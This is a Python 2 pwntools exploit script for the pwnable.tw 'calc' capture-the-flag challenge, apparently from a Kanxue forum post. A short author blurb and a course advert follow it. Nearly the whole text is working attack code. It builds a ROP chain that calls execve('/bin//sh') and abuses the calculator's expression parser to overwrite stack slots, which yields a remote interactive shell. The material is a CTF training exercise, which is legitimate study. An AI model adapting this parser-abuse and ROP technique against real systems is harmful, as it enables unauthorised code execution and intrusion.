
```
#!/usr/bin/env python2

# -*- coding: utf-8 -*-

from PwnContext.core import *

from struct import pack

local = True



# Set up pwntools for the correct architecture

exe = './' + 'calc'

elf = context.binary = ELF(exe)



#don't forget to change it

host = args.HOST or 'chall.pwnable.tw'

port = int(args.PORT or 10100)



#don't forget to change it

#ctx.binary = './' + 'calc'

ctx.binary = exe

libc = elf.libc

ctx.debug_remote_libc = False

ctx.remote_libc = libc

if local:

    context.log_level = 'debug'

    try:

        io = ctx.start()

    except Exception as e:

        print(e.args)

        print("It can't work,may be it can't load the remote libc!")

        print("It will load the local process")

        io = process(exe)

else:

    io = remote(host,port)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================



# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)



#shellcode
shellcode = ''



shellcode += pack('<I', 0x080701aa) # pop edx ; ret
shellcode += pack('<I', 0x080ec060) # @ .data
shellcode += pack('<I', 0x0805c34b) # pop eax ; ret
shellcode += '/bin'
shellcode += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
shellcode += pack('<I', 0x080701aa) # pop edx ; ret
shellcode += pack('<I', 0x080ec064) # @ .data + 4
shellcode += pack('<I', 0x0805c34b) # pop eax ; ret
shellcode += '//sh'
shellcode += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
shellcode += pack('<I', 0x080701aa) # pop edx ; ret
shellcode += pack('<I', 0x080ec068) # @ .data + 8
shellcode += pack('<I', 0x080550d0) # xor eax, eax ; ret
shellcode += pack('<I', 0x0809b30d) # mov dword ptr [edx], eax ; ret
shellcode += pack('<I', 0x080481d1) # pop ebx ; ret
shellcode += pack('<I', 0x080ec060) # @ .data
shellcode += pack('<I', 0x080701d1) # pop ecx ; pop ebx ; ret
shellcode += pack('<I', 0x080ec068) # @ .data + 8
shellcode += pack('<I', 0x080ec060) # padding without overwrite ebx
shellcode += pack('<I', 0x080701aa) # pop edx ; ret
shellcode += pack('<I', 0x080ec068) # @ .data + 8
shellcode += pack('<I', 0x080550d0) # xor eax, eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x0807cb7f) # inc eax ; ret
shellcode += pack('<I', 0x08049a21) # int 0x80



def set_value(addr):
    io.sendline('+'+str(addr))
    value = int(io.recv())
    if value > 0:
        io.sendline('+'+str(addr)+'-'+str(value)+'+'+str(u32(shellcode[(addr-361)*4:(addr-361+1)*4])))
    else:
        io.sendline('+'+str(addr)+'+'+str(-value)+'+'+str(u32(shellcode[(addr-361)*4:(addr-361+1)*4])))
    io.recv()



def exp():
    io.recv()



    for i in range(361,361+len(shellcode)/4):
        set_value(i)



    io.sendline('')



if __name__ == '__main__':
    exp()
    io.interactive()
```

## 关于我

博客有我的联系方式,欢迎大家来玩,地址:144K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3f1H3P5o6u0D9i4K6u0W2j5$3^5`.

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2020-8-12 20:22

被0x2l编辑，原因： 修改
